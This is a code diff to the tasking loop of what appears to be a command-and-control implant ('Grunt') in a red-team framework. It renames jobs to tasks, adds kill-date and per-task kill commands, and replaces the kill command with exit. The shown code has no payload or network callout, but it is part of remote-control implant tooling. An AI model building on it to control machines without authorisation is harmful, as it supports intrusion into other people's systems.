@@ -67,7 +67,7 @@ namespace BruteExecutor
                 }
                 catch (Exception) { }
 
-                List<KeyValuePair<string, Thread>> Jobs = new List<KeyValuePair<string, Thread>>();
+                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                 Random rnd = new Random();
                 int ConnectAttemptCount = 0;
                 bool alive = true;
@@ -109,24 +109,51 @@ namespace BruteExecutor
                                 }
                                 else
                                 {
-                                    output += "Error parsing: " + message.Message.Split(',')[1];
+                                    output += "Error parsing: " + message.Message;
                                 }
                                 messenger.WriteTaskingMessage(output, message.Name);
                             }
-                            else if (message.Type == GruntTaskingType.Kill)
+                            else if (message.Type == GruntTaskingType.SetKillDate)
                             {
-                                output += "Killed";
+                                if (DateTime.TryParse(message.Message, out DateTime date))
+                                {
+                                    KillDate = date;
+                                    output += "Set KillDate: " + KillDate.ToString();
+                                }
+                                else
+                                {
+                                    output += "Error parsing: " + message.Message;
+                                }
+                            }
+                            else if (message.Type == GruntTaskingType.Exit)
+                            {
+                                output += "Exited";
                                 messenger.WriteTaskingMessage(output, message.Name);
                                 return;
                             }
-                            else if (message.Type == GruntTaskingType.Jobs)
+                            else if(message.Type == GruntTaskingType.Tasks)
                             {
-                                if (!Jobs.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
+                                if (!Tasks.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                 else
                                 {
                                     output += "Task       Status" + Environment.NewLine;
                                     output += "----       ------" + Environment.NewLine;
-                                    output += String.Join(Environment.NewLine, Jobs.Where(J => J.Value.IsAlive).Select(J => J.Key + " Active").ToArray());
+                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
+                                }
+                                messenger.WriteTaskingMessage(output, message.Name);
+                            }
+                            else if(message.Type == GruntTaskingType.TaskKill)
+                            {
+                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
+                                if (!matched.Any())
+                                {
+                                    output += "No task with name: " + message.Message;
+                                }
+                                else
+                                {
+                                    KeyValuePair<string, Thread> t = matched.First();
+                                    t.Value.Abort();
+                                    output += "Task: " + t.Key + " killed!";
                                 }
                                 messenger.WriteTaskingMessage(output, message.Name);
                             }
@@ -134,14 +161,14 @@ namespace BruteExecutor
                             {
                                 Thread t = new Thread(() => TaskExecute(messenger, message));
                                 t.Start();
-                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                 bool completed = t.Join(5000);
                             }
                             else
                             {
                                 Thread t = new Thread(() => TaskExecute(messenger, message));
                                 t.Start();
-                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                             }
                         }
                     }
@@ -518,10 +545,12 @@ namespace BruteExecutor
         SetDelay,
         SetJitter,
         SetConnectAttempts,
-        Kill,
+        SetKillDate,
+        Exit,
         Connect,
         Disconnect,
-        Jobs
+        Tasks,
+        TaskKill
     }
 
     public class GruntTaskingMessage
